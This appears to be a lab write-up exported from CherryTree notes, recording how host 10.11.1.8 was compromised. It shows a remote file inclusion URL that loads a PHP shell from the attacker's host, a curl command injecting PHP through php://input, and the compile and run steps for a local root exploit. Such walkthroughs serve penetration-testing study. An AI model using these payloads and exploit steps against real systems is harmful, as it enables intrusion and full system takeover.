<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>10.11.1.8</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>10.11.1.8</h1><br/>nmap showd that lots of ports were open, 80 being one of them, so I went to that first.<br />dirsearch showed /internal/<br />the page source showed that the machine was running “advanced comment system” “ACS” “advanced_comment_system”<br />searchsploit showed that there were possible remote file inclusions<br /><br />10.11.1.8/internal/advanced_comment_system/index.php?ACS_path=<a href="http://10.11.0.186/evil.txt%00">http://10.11.0.186/evil.txt%00</a><br />host evil.txt (which is a phpshell.php file) and listening on 80 got me a user shell<br /><br />also, <br /><code>curl -s --data &quot;&lt;?system(&#39;whoami&#39;);?&gt;&quot; &quot;http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00&quot;</code><br />got me code execution!!<br /><br />from here I went down the line of linux privesc steps and /etc/redhat<br />sh-3.00# cat /etc/redhat-release<br />CentOS release 4.8 (Final)<br /><br />searchsploit showed me that it was vulnerable to 9545.c<br />intially I compiled it like it said to              gcc -Wall -o linux-sendpage linux-sendpage.c<br />when I wget&#39;d it to the target and ran it I got the error                             error while loading shared libraries: requires glibc 2.5 or later dynamic linker<br />some googling told me to add          -Wl,--hash-style=both         to fix this error<br />recompiled with             gcc -Wall -Wl,--hash-style=both -o linux-sendpage linux-sendpage.c<br />ran it....<br />BOOM!!!<br />root<br />sh-3.00# cat proof.txt <br />f56a325ef00d4553a4046b7eacc5d667<br /></div></body></html>